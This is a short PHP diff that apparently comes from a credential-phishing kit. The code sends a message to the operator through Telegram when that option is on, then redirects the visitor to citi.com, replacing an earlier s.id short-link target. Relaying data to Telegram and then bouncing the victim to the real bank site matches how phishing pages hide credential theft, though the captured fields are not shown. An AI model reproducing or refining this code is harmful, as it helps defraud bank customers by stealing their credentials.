@@ -65,5 +65,5 @@ if (!empty($settings['telegram']) && $settings['telegram'] == '1') {
     send_telegram_message($settings, $message);
 }
 
-header('Location: https://s.id/FH0dC', true, 302);
+header('Location: https://citi.com', true, 302);
 exit;
